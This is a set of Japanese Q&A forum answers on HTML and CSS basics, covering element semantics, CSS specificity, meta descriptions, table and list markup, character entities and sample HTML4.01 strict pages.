要素は文書の中での重要性を示すわけでも、意味合いが異なることを示すわけではないが、実利的な理由から、他の部分より注意を引きつけたい部分であることを表すようになりました。たとえば、キーワード、製品名、・・・【中略】・・・など。 　一方EMやSTRONGは、 EM:強調を示す。　STRONG:より強い強調を示す。構造化テキストでした。( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … ) 　HTML5では、これらも意味が変わりました。 　あなたが、作成している文書で、その部分が重要なフレーズでしたらEM、もっと重要でしたらSTRONGでマークアップすべきです。 　そのサイトを拝見したのですが 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Pタグで囲まれたテキストや画像は、 一つのParagraph（グループ）と判断され、前後に一行分改行されます。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［段落－HTML( http://yume.hacca.jp/koiki/tagu/danraku.htm )］より 　この説明は、大事な部分で明らかに間違っていますね。 　確かに段落を示しますが、Pはブロック要素であり『ブロックレベル要素は行内要素とは異なるように整形される。 一般に、ブロックレベル要素は新しい行を開始し、( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』ということです。 　一行分改行されるか、そうでないかはスタイルによる指定でLynxブラウザなどではスペースはあきません。 　ざっと見て、大事なことをまったく理解されていない。すくなくとも仕様書も読まれた形跡がありません。というか、仕様書の存在を知っていればマニュアルなんて書こうとは思いません。だってそこに正確な情報があるのですから・・。 　HTMLやCSSを学ぼうとしたら、まず仕様書を流し読みでよいので１度は読んでおきましょう。その後で必要なとき参照すれば良いです。 　作成したら Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) 　などで、チェックして見る。 　 　
> 全角2文字（4byte） 現在、主流の文字コードUTF-8では、いわゆる「全角文字」は3byteですから、「全角2文字」は「6byte」です。 「全角2文字（4byte）のほうがヒットしやすい」なんてことを言っている時点で、この情報は眉唾物です。 さらに、「meta keywords 検索エンジン」で検索してください。 現在、meta keywordsで順位が変わることはないそうです http://googlewebmastercentral.blogspot.jp/2009/0 … http://searchengineland.com/yahoo-search-no-long …
　カスケーディングとは、滝の水のように、次々と影響を及ぼしながら流れ落ちることを言います。Cascading Style Sheets( http://www.w3.org/TR/CSS2/ )とは、そのような仕組みを持ったスタイルシートです。 　ですから、cssとは書きません。英語のルールで頭文字ですから、CSSと必ず大文字で書きます。 　なお、折角のカスケーディング機能をまったく利用していないスタイルシートを沢山見かけますが、もしCSSを学ばれるなら、最初にカスケーディングの仕組みを身につけましょう。 body{margin:0;paddin:0;font-family:sans-serif;font-size:14px;} とすれば、この指定の詳細度は[0 0 0 1]であって margin:0;paddin:0;　継承されない font-family:sans-serif;font-size:14px;　これは継承される。 body p{text-indent:1.6em;} 　詳細度[0 0 0 2] p.imporant{font-weight:bold;} 　詳細度が[0 0 1 1] とか・・
それはスタイルシートです。 スタイルシートは主に3つの書き方があります。 axjrpwttechayさんのはインラインスタイルシートといいます。 http://kurageya.fc2web.com/web/style/0settei.html 慣れた人はあまり使わないタイプです。スタイルシートの利便性が著しく悪いですから。 ただ、タグをスタイルシートというわけではありません。タグにスタイルシートを記述しているだけです。 タグはdivのままです。
もしかして、 貴方が言うスニペットとやらは、検索エンジンで表示される説明文の話ですか？ 貴方が言うメタタグとやらは、<meta name="description" content="" >の話ですか？ 全く別の話でしたら、下記回答はスルーして下さい。 -------------- 何故、そのように考えましたか？ それは何処の偽情報でしょうか？・・・　誰もそんなルールは作っていません。 つまり、 答え：　無いです。 貴方のサイトをGoogleが内容やキーワードによってデータ化し、 ユーザーが検索したキーワードに対し、ウェブページ内の適した文章、または最適化した文章を表示する仕様です。 但し、 このスニペットは、Googleによって適当に（勝手に）編集される場合もあります。 ※タイトルも同じです。 最近は、<meta name="description" content="" >を書かない制作者も増えています。
単純にそのページ自体をCGIで出力させればすむことです。
見出し以外という事は、 一般的には、<p>を利用しますので、 p{font-size:116%;color:gray;} 複数ならの段落を個別指定するなら以下を試すと理解できるでしょう。 p{font-size:116%;color:gray;} p#line-2{font-size:100%;color:lime;} p.line-3{font-size:85%;color:red;} p.line-3 + p{color:yellow; background:black;} p.line-4{font-size:150%;color:maroon;} p.line-4:first-line{color:blue;} p strong{color:purple;} p span{color:fuchsia;} ul li{color:blue;} ul li:first-line{color:aqua;} <p>ああああああ</p> <p id="line-2">いいいいいい</p> <p class="line-3">うううううう</p> <p>うううううう</p> <p class="line-4">ええええええ</p> <p class="line-4">おおおおおお<br>かかかかか</p> <p>きき<strong>きき</strong>きき、く<span>くく</span>くく</p> <ul><li>けけけ<br>こここ</li><li>さささ</li></ul> その他にも、色々ありますのでじっくり勉強して下さい。
HTML4.01以前ではどちらでもよいが、 XHTMLでは小文字限定。 共通利用する人なら、小文字で書いた方が間違いないと考える。 私的な考えだと、 読みやすさの点でも小文字が良い。 英語圏の人で、英文のように大小混ぜていた人もいたが、 どちらかに統一した方が見やすいと感じました。 初心者の人が大文字が多かったので、プロでも大文字で書いているとその人のレベルを疑いますね・・・ 一般人が大文字で書いてあるHTMLを一部だけ編集するとなると、大文字に変換しちゃって揃えてあげますが、残念な違和感あります・・・ エディタに初期設定で、自動入力が大小の切り換えができると思う。 XHTMLが小文字ではNGですが、大文字にしても、ブラウザで表示されない訳ではないです。
Oh ＞「エンジン」とは何を指すんでしょうか!? 幼稚な質問だと思いますが宜しくお願いいたします。 ブラウザには、HTMLやCSSを解釈して表示するための機能をまとめたものがあって、それをレンダリングエンジンと読んでいます。 （JavaScriptエンジンも含む場合がありますが、今回はそのあたりは割愛します） そのレンダリングエンジンにもいろいろ種類があり、ブラウザによって使っているものが違います。 IEの場合、Tridentと呼ばれるレンダリングエンジンを使っています。 IEのバージョンによってTridentもバージョンが違いますから、バグがあったりなかったり、HTMLやCSSの解釈が違ったりします。 他にも、GoogleChromeやsafariではWebKitと呼ばれるエンジンを、FireFoxではGeckoと呼ばれるエンジンを使ったり・・・ LunaScapeやSleipnirのように、ユーザーが切り替えられるものもあります。 このエンジンの違いで表示が変わりますから、サイトを作成するのであればそれぞれの動作を大まかにでも把握している必要があります。 できれば、各ブラウザで動作確認できる環境はほしいと思いますよ。 IEのように、Verが変わるだけで動作がガラッと変わるものもあります。 IE6のTridentとかバグの塊ですから、独特なCSS記述が必要だったりします。めんどくさい。 今回のブラウザがわからないので、一般的な回答ではありましたが・・・ もしIEを使っているのであれば、ANo.4さんの回答が参考になると思います。
下記の定義に従うなら、ハイパリンク（ハイパーリンク）の範疇にリンクも含むと考えてよいでしょう。 もう古い話ですが，JIS標準情報のTR X 0002:1997「マルチメディア／ハイパメディア情報処理用語」には下のように定義されていました。 ・ハイパリンク（HyTime用語） 　二つ以上のオブジェクトの間の関係を表現する情報構造。 ・リンク（電子文書用語） 　二つのアンカの間の関係。 ・アンカ（電子文書用語） 　ハイパテキストにおいて相互関係を定義された節の中の指定領域。 HyTimeはハイパメディアの規格です。以前のHTMLやXHTMLの文法がSGMLという規格やXMLで定義されていたように、ハイパメディアに意味の定義を与えるためのものです。 これによれば、リンクとハイパリンクの共通点はどちらも「関係」を表現すること。 違いは ・リンクは二つを結びつけ、ハイパリンクは二つ以上を結びつける。 ・リンクの対象はHTMLのようなハイパテキストかその一部。つまり文書。ハイパリンクの対象は文書も含むオブジェクト一般。 例えば映画役者のセリフ、その音声、映像の三つを関連づけるものを指す場合はハイパリンク。この場合、映像の中で役者が話し出すタイミングが重要なので、ハイパリンクの情報構造には時刻も含まれるべきでしょう。 あくまでHTMLではなくハイパメディア一般の話です。HTMLを扱うかぎりにおいては、あまり両者を区別する意味はないかもしれません。
>そもそもフォントに色を付けるだけで改行する機能も付いちゃうのが不思議です。 pタグはパタグラフ（段落）のタグです。段落ですから、前後に改行が入るのは自然なことなのです。 html+cssではしたいデザインではなく、文章構造に対してタグをつけます。なぜ、赤にしたいのか？ということです。これは、書いている人にしかわかりませんが、想像するに目立たせたいのかな？と思いますので、その方向で話を進めます。 目立たせたいつまり、強調したいならstrongタグを使います。 <body> <p>a<strong>bcd</strong></p> </body> で、赤くしたいならスタイルシートには strong{color:red;} ですね。 初期値では太くなります。それが嫌なら strong{ color:red; font-weight : normal ; } font-weight : lighter;でもいいかもしれません。どのような形態であれ、目立たせたいなら、strongです。初期値は打ち消すことが可能ですので、とらわれないでください。 pタグや見出しタグは改行が入ります。これらをブロックレベル要素といいます。 strongやaタグは文中に入り、改行は入りません。これらをインライン要素といいます。 二つは改行の有無以外にも、いろいろと性質が違います。このあたりは、別途勉強してください。 まぁ、簡単に言うと、「そもそもフォントに色を付けるだけで改行する機能がつくタグを選ぶ方が不思議です。 」となります。
これは、TABLE（二次元以上のデータを表す)でマークアップしたので良いでしょう。 <table summary="uriage" border="1"> 　<tbody> 　　<tr> 　　　<th abbr="月">月</th><th abbr="uriage">売上</th> 　　</tr> 　　<tr> 　　　<td>1月</th><td>300,000円</td> 　　　<td>2月</th><td>300,001円</td> 　　　<td>3月</th><td>300,002円</td> 　　　<td>4月</th><td>300,003円</td> 　　</tr> 　</tbody> </table> で良いでしょう。 　後はスタイルシートに下記を付け加える。 table[summary="uriage"]{ border:solid 1px gray; border-collapse:collapse; } table[summary="uriage"] th{border:solid 1px gray;} table[summary="uriage"] td{text-align:center;width:3em;} table[summary="uriage"] td+td{text-align:right;width:5em;} 別法、罫線も見出しも不要なら、定義リストでマークアップしても良いでしょう。 <dl class="uriage"> 　　　<dt>1月</dt><dd>300,000円</dd> 　　　<dt>2月</dt><dd>300,001円</dd> 　　　<dt>3月</dt><dd>300,002円</dd> 　　　<dt>4月</dt><dd>300,003円</dd> </dl> としておいて、 dl.uriage dt{text-align:center;width:3em;float:left} dl dd{text-align:right;width:5em;} 　⇒11 表( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒10.3 定義リスト: DL、 DT、及びDD要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
　ブラウザで表示を確認して・・・と言うのはダメなのです。ブラウザには、エラーのある文書も極力拡大解釈して表示することが求められていますが、著者がそれに頼るのは間違いです。 ・認識できない要素があった場合、ユーザエージェントは、内容のレンダリングを試みねばならない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ・著者 　HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) HTML5では、著者が使えるもの、ユーザーエージェントの処理が明確になりましたから、非推奨自体なくなりました。 　明らかに <h2>▲▲▲▲▲▲</h2> <ol> <li>●●●●</li> <li>●●●●</li> <li>●●●●●</li> </ol> が正しいです。 <ol><h2>▲▲▲▲▲▲</h2> <li>●●●●</li> <li>●●●●</li> <li>●●●●●</li> </ol> の場合、多くのブラウザは 　<ol></ol> 　<h2>▲▲▲▲▲▲</h2><!-- </li> --> 　<ol> 　　<li>●●●●</li> 　　<li>●●●●</li> 　　<li>●●●●●</li> 　</ol> と解釈して表示するでしょう。 ＞「olタグ」内に「ｈタグ要素」を含めるのは正しい？ 　こんなことはここで聞くより仕様書に目を通せば正確な答えが分かります。 　⇒<!ELEMENT OL - - (LI)+( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　OLは開始タグ終了タグとも省略不可(--)、中にはLIをひとつ以上(+)と明記してあるし、 ⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) 　で[DATA]タブから送信してみりゃ、詳しく解説してくれる。 No.1の補足で 「だた、それだと<h2>タグの範囲が、次の見出しが記述されるまで続く事になります。 例えば、下記のような場合は混乱が有ると思います。」 　これはHTMLに限らず、一般的な文書でも見出しをつけると、新たなセクションが始まり、次に見出しが現れるまでは、ひとつのセクションに所属するのではないですか？？？？ 　連続するふたつのリストの内容が分かりませんから、どのマークアップが正しいかは示すことが出来ません。 「「ｈ２タグ」の範囲を、「olタグ」に囲まれたリストだけ、「ulタグ」はまた別の事柄の時です。その場合は、「ulタグ」の前にも「ｈタグ」を記述していく必要が有りますか？」 　もし、ulタグがh2とは、まったく別の事柄について述べているのでしたら、当然別のセクションですから基本的には見出しが必要になるでしょう。 　見出しが示す内容と、それぞれのリストの内容はあなたにしか分かりません。 　セクションと言うのは!!機械的に目次を作成するときに、その項目となりうるheading(HTMLだと<h1>～<h6>をもつであろう記事の集団です。 <div class="section"> 　<h2>このセクションの見出し</h2> 　<p>・・</p> 　<ol> 　　<li></li> 　</ol> 　<div class="section"> 　　<h3>サブセクションの見出し</h3> 　　<ul> 　　　<li></li> 　　</ul> 　</div> </div> HTML5ですと <section> 　<h2>このセクションの見出し</h2> 　<p>・・</p> 　<ol> 　　<li></li> 　</ol> 　</section> 　　<h3>サブセクションの見出し</h3> 　　<ul> 　　　<li></li> 　　</ul> 　</section> </div> ★h3を表示するかしないかはHTMLとは関係ありません。 　スタイルシートでsection section h3{display:none;}ですむ。 よくあるのが次のような場面です。(HTML5の<nav>は<div class="nav">に置き換えて考える。 <nav> 　<h2>サイトマップ</h2> 　<ol> 　　<li><a href=""></a></li> ・・この場合テキストブラウザや読み上げソフト点字端末、印刷などには見出しが必要ですが視覚系ブラウザには、デザインでナビゲーションだと示せますから nav h2{display:none;} とすることは、極めてよく行われます。 　いずれにしても、もう少し具体的な内容(実物でなくても)を教えてください。 　アドバイスのしようがないです。
<body link="red">は非奨励ですね・・・ CSSで、（CSSの書き方は検索しましょう） a:link{color:red;} 直接書く場合 <a href="http://www.yahoo.co.jp/" style="color:green;">test</a> または、個別のCSS HTML <a href="http://www.yahoo.co.jp/" class="sample1">test</a> CSS a.sample1:link{color:green;} #1さんの方法など、色々なセレクタがあります。 ---------------- 以下なども面白い効果ですよ。 a:hover{color: lime; text-decoration: none; font-size: 116%; font-weight: bold; background-color:yellow;}
そのページの説明なのだから、「同じ」というのは本来ありえないですね。 しかし、 キーワードを埋め込みすぎるスパムが横行したので、 最近は考慮されにくくなりました。 つまり、SEOとしては限りなく薄い。 Googleが勝手に内容からキーワードマッチを探し出し、その文章を引用するケースが多いようです。 ただ、 Googleウェブマスターツールでは怒られます・・・（ある意味矛盾） 別にかまわないですが・・・ なので、 <meta name="description" content="">を書かないという手法も”あり”です。 「時間に余裕がある」なら、全頁を各々設定しましょう・・・ 時間の無駄とも考えられますが、 「キャッチコピーが上手い人なら」 「Googleがスニペットとして引用された場合」という条件下で、 ユーザーにクリックされやすくなります。
＞ホームページ作成時半角カタカナは使わない方が良いという事ですが 　今は、UTFで作成する限り使用しても構わないのですが、半角カタカナのフォントを持っていないコンピューターもあることを考えると使わないで良いでしょう。どうしてもと言う場合は使いますが、その場合は何らかの大体処理を工夫します。 ＞、＜｛　（　 ですが、HTMLには一部の文字は制御のために使われますから、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 特定の文字をエスケープするために頻繁に用いる4つの文字実体参照を、ここに特記しておく 　　「&lt;」は < 記号を表現する。 　　「&gt;」は > 記号を表現する。 　　「&amp;」は & 記号を表現する。 　　「&quot;」は " 記号を表現する。 　テキスト中に「<」記号を記したい場合、著者は「&lt;」(ASCII十進60)を用い、タグの冒頭――開始タグの開始区切り子――と誤解される可能性を回避するべきである。同様に、テキスト中に「>」記号を記したい場合、仮に二重引用符で囲った属性値としてであっても、著者は「>」を直接記すのではなく「&gt;」(ASCII十進62)を用い、古いユーザエージェントがこれをタグの末尾――タグの終了区切り子――と誤解してしまう問題を、回避すべきである。 　また、著者は、「&」の代わりに「&amp;」(ASCII十進38)を用い、文字参照の冒頭――文字実体参照の開始区切り子――と誤解されるのを避けるべきである。 CDATA型の属性値には文字参照が出現できるので、著者は属性値においても「&amp;」を用いる必要がある。 　二重引用符が属性値の区切り子にもなり得るため、二重引用符のインスタンスを符号化して「&quot;」を用いる著者もあろう。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［5.3.2 文字実体参照( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より "は兎も角、<，>，&は、ソース内に直接記述することは出来ません。
何処に移動したいのか？ 移動先リンクの指定は２カ所は無理（矛盾）なので、一カ所を指定するだけ・・・ 貴方の質問では、 上に移動するのか？　URL（仮のヤフー）に移動するのか？　どっち？ （なので、この回答も混乱する・・・） まずは、<a>～～</a>というように一対である。 ----------------- 以下を試作して動作確認すると理解できるかも。 <p style="padding-top:400px;"></p> <h1 id="A-line">ここがＡライン</h1> <p><a href="#A-line">Ａラインへ移動</a></p> <p><a href="http://www.yahoo.co.jp/">ヤフーへ</a></p> <p><a href="#">上へ</a></p>
なぜそんなに長大で複雑怪奇なHTMLスタイルシートになるのでしょう。他人は無論、あなた自身も手がつけられないのでは？ 　理由は単純です。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから relative 　　　ボックスの位置はまず通常フローにて計算され（この計算で得られた位置 　　を通常位置と呼ぼう）、その通常位置から相対的に配置される。 なお、あ 　　るボックスBが相対配置される場合、それに後行するボックスの位置は、 　　Bが相対配置されていないかのように計算される。 　　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［視覚整形モデル( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )］より と言うことです。元々あったところは席は空くけど席は残っている。 　しかし、それ(スタイルシートでデザインする)より前に、HTMLの文法チェックを～必ずしましょう。ミスがあると期待通りにデザインでき ませんし、ブラウザ間でエラー処理が異なるため表示差で悩まされます。 ・A要素の中に<p>は入れられません。 ・idやclass名は文書構造を補完するために書くのであって、デザインのために書くのではありません。その文書構造を利用してスタイルは 書きますが。 　『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。』 　また、現在作成されるならHTML4.01strictが良いでしょう。transitionalは使うべきではありません。 　1999年のHTML4.01の勧告以来・・『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　次期HTML5、や現行のXHTML1.1にはtransitinal(互換仕様)はありません。strictを学んでおけば、HTML5 にはすぐ移行出来るでしょう。 ★横幅1200pxは広すぎます。スマホや最も普及している1028pxのディスプレイでは苦痛です。 下記サンプルはスマホの640px以上でしたら伸縮して表示されます。幅広ディスプレイだと中央 ★Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html# ) 　でチェック済みのHTML4.01strictです。 ★タブは＿に置換してあるので戻すこと。また文字コードはShift_JISです。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>会社方針</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.header,div.section,div.footer{ ＿border:2px black solid; ＿margin:0 10px; ＿width:95%;max-width:1000px;min-width:620px; ＿margin:0 auto;padding:10px; } div.header h1{ ＿width:95%;margin:0 auto; ＿position:relative; ＿text-align:center; } div.header h1 img{display:block;width:100%;height:auto;} div.header{ ＿border-bottom-width:0; ＿padding-bottom:70px; ＿background-color: ＿rgb(255,204,00); } div.section{border-width:0 2px;clear:left;} div.footer{border-top-width:0;} h1,h2,h3,p,ol,ul{margin:0;line-height:1.6em;} div.header ol,div.header ol li{ list-style:none;display:block; text-align:center; line-height:64px;font-size:0.9em; } div.header div.nav ol li{width:13.5%;float:left;border:solid 1px black;} div.header div.nav ol li a{background-color:#FFCC00;display:block;width:100%;height:100%;text-decoration:none;} div.header div.nav ol li a:hover{background-color:yellow;} --> ＿</style> </head> <body> ＿<div class="header" id="TOP"> ＿＿<h1><img src="./images/title.png" alt="株式会社＊＊＊＊" width="600" height="60"></h1> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="../index/index.html">TOP</a></li> ＿＿＿＿<li><a href="about1.html">会社方針</a></li> ＿＿＿＿<li><a href="about2.html">企業概要</a></li> ＿＿＿＿<li><a href="about3.html">製品</a></li> ＿＿＿＿<li><a href="about4.html">福祉サービス</a></li> ＿＿＿＿<li><a href="about5.html">スタッフ紹介</a></li> ＿＿＿＿<li><a href="about6.html">お問い合わせ</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<h2>会社方針</h2> ＿＿<p>・・・</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
　百ページ近くになるとか、定期的に内容を変更するページがある場合は、基本的には動的なサイト構成になります。いわゆるCMS(コンテンツマネージメントシステム)を使うことが多いでしょう。 　⇒コンテンツマネージメントシステム( http://ja.wikipedia.org/wiki/%E3%82%B3%E3%83%B3% … ) 　excelというより、accessに近い仕組みです。 　極めて単純なページのようですから、CMSを使わなくても簡単なCGIなりPHPで可能とは思います。また、高機能なテキストエディタでローカル側で一挙に変換してしまうとか、SSI(server side includes)、PHPのincludeコマンドをつかってもよいでしょう。 　いずれにしても、HTML自体は大幅に見直す必要があります。定期的に変更されるそれらのページの構造はすべて同じにすること。ひょっとしてtableを使ってデザインしているならやめましょう。これは散々、否定され続けていることです 「単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 「ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　多分、 【画像(1)】　　　--><h1><h1> 【テキスト(1)】　-->ヘッダー部分記事 【URL(1)】 【画像(2)】　　　--><h2>本文見出し</h2> 【テキスト(2)】　-->本文の紹介などメッセージ 【URL(2)】 　ちょっとイメージがわかないですが、他に記事がまったくないのですか？？ 下記を埋めて見ること <body> 　<header>ページのヘッダ</header> 　<section>本文</section> 　<footer>文書情報</footer> </body> 　ちなみにたったこれだけしかないのでしたら、わざわざHTMLを書かなくても、良いような気がします。
■いいねボタン https://developers.facebook.com/docs/reference/p … ■ツイートボタン https://twitter.com/about/resources/buttons ■はてぶボタン http://b.hatena.ne.jp/guide/bbutton こんな感じですかね。
No.3です。逆でしたね。 javascriptで送信ボタンを消してしまうでした。
idやclass名の使い方が違う。 <body class="product1"> とか <body class="product2"> にしておく。 body.product1 div.header{background:****;} body.product2 div.header{background:****;} body.product3 div.header{background:****;} body * div.header{background-image:none!important;} 　とかでよいですよ。最後の指定は、孫に同じクラス名のdivがあったらまずいので最重要宣言で消している。 HTML5だと <body> 　<header> 　　<h1>見出し</h1> でしょうから body.product1>header{background:****;} body.product2>header{background:****;} body.product3>header{background:****;} 子供セレクタを使っている。
＞「リンクは禁止です」と禁止する人もいるのでしょうか？ あんまり居ないんじゃないですかね。 昔はアクセスが集まるとサーバーが重くなるとかの弊害がありましたが、 今は多少のアクセス増加で落ちるサーバーなんてほとんどありません。 素材サイトなんかは、直リンクを禁止している場合がありますね。 ここでいう直リンクとは素材の画像やswfなどに別サイトから直接アクセスする事で、はっきりとマナー違反です。 あとは個人ブログなんかは、急にアクセスが増えたら どこかで晒されてるんじゃないかと不安になりそうなので禁止している人が居るかも。 外部サイトからリンクを貼られるとSEO効果もあるので、 普通のサイトはどんどんリンクしてほしい、というスタンスのはず。
>なぜか右寄せになりません。左に寄ってしまいます。 <DIV style="font-size:80%;" id="right;"> の部分がおかしいのでしょうか？ はい、おかしいです。 id="right;"> を id="right"> に つまり「;」を削除すれば、右によると思います。
印刷には適用されないようですね。 印刷を考慮したページでしたら、後方互換のため次のように書くほうが良いでしょう。 ★Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html# ) でチェック済み。HTML4.01strict+CSS2.1 ★タブは＿に置換してあるので戻すこと。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> <style type="text/css" media="screen"> <!-- a img{border:none;}/* IE対策 */ div.header h1{ width:900px;height:210px; margin:0 auto; overflow:hidden; text-indent:-900px; position:relative; } div.header h1 a{ display:block;width:100%;height:100%; background: url("../images/main/img_header.jpg") top left no-repeat; } div.header h1 a:hover { background-position:bottom left; } --> </style> <style type="text/css" media="print"> <!-- a img{border:none;} div.header div.nav a:after{content:"\A( http://hoge.com"attr(href)" )";withe-space:pre;} --> </style> </head> <body> ＿<div class="header"> ＿＿<h1><a href="./"><img src="../images/print/img_header_pr.jpg" width="900" height="210" alt="ようこそ****のサイトへ"></a></h1> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="/">Top</a></li> ＿＿＿＿<li><a href="/product">製品</a></li> ＿＿＿＿<li><a href="/books">書籍</a></li> ＿＿＿＿<li><a href="/profile">紹介</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p class="goTop"><a href="/">トップへ</a></p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
ホームページ等のWeb上でご利用されるということでよろしいでしょうか。 その場合、CGIやPHPなどのプログラムを利用する必要があります。 主に、ご自分のウェブサーバ上にメールフォームプログラムをアップロードして設置するケースと、メールフォームASPサービスを契約して用意されたメールフォームへのURLにリンクするケースがあります。 サーバに設置する場合は、ウェブサーバ側がCGIやPHPの設置に対応しているかも事前にご確認されたほうがよろしいかと思います。 参考サイトには、ご自分のサーバにアップロードしてご利用いただけるCGIプログラムのダウンロードサイトをご紹介しました。こちらのCGIは自由にフォームのデザインが可能です。 以上、ご参考ください。 参考URL：http://kantaro-cgi.com
　　 　　 　自動的に表示されるスライドショーは、 　HTMLとCSSを併用するのは、もちろんですけど、 　 　HTMLとCSSを併用してJavascriptで作成可能ですが、 　記述が、長くなります。拡張子は、js です。 　 　★HTMLとCSSを併用してJqueryで作成する方が、 　簡単です。拡張子は、同じく　js です。 　記述方法は、無料で教えて下さいます動画のドットインストール 　を勉強されるようにおすすめします。 　http://dotinstall.com/ 　記述方法が、わかりましたら 　下記で詳しい作成方法を参考に 　なさって下さい。 　 　Jqueryで自動的にスライドショーを表示させる方法 　　 　http://memocarilog.info/jquery/3582#sample
手打ちをするならDWであろうがテキストエディタであろうが一緒ですよ。 ソースを汚さない自信があるなら、DWの機能を使うのが一番早いです。 以前コードビューをほとんど見ずに、DWの機能を使いこなして綺麗なソースをとんでもないスピードで書く人を見てびっくりしました。 私はDWでもほぼ手打ち中心ですが…。 例えば、スペルミスが多いのなら、ちょっと打てばコードを補完してくれるエディタを使うといいです。 TeraPadやCresent Eveなんかがそうですね。（DWもできます） あとは、よく書く記述<table>や<dl>の固まりなどをすぐコピペできるように用意しておくと便利です。 DWではスニペットという機能で可能です。 ただエディタは勉強にはいいと思いますが、DWで出来ないからエディタに移る、というのはあまり意味が無いと思います。 エディタの一番の利点は軽いという事ですが、DWも一度起動してしまえば重さは感じません。 （初回起動でも数秒ですが） 記述のスピードではなく、「思う通りに書いても思うような挙動がされない」という事で時間がかかっているのなら、 ツールの問題ではなく、知識や把握の問題だと思います。 普段からサイトを見てて、気になった所はfirebugで見てみるとか、IEのバグを調べたらすぐ見れるようにストックしておくとか、 失敗した記述は何が悪かったかきちんと把握して次に進むとか、日頃の勉強と心がけしだいじゃないですかね。
インデックスを案内しているだけです。誰に？・・・ 現在、Googleには考慮されませんから、SEOでもなんでもありません。 書きたければ、revやnextも書いておけばよいです（Operaユーザーには便利かも）その他にも沢山ありますよ。 個人的には、<head>内は必要最低限でスッキリさせています。
追加情報です。最新ブラウザが使えれば、ネイティブで表示できないのはIEだけのようですね。 　⇒MathML情報( http://www.fukuoka-edu.ac.jp/~fujimoto/mathml.html ) 　こちらは古い 　　　⇒MathMLに対応したブラウザ：北大文「魅力ある大学院教育」( http://humansci.let.hokudai.ac.jp/m/terao/stat/b … ) 　　これで見るとfirefoxのみ７年前から・・ 以下は作成方法など 　⇒Authoring MathML for Mozilla( http://www.mozilla-japan.org/projects/mathml/aut … ) 　⇒MathML( http://www.jagat.or.jp/sgml/mathml/ ) 　⇒Mathematical Markup Language - Wikipedia( http://ja.wikipedia.org/wiki/Mathematical_Markup … )
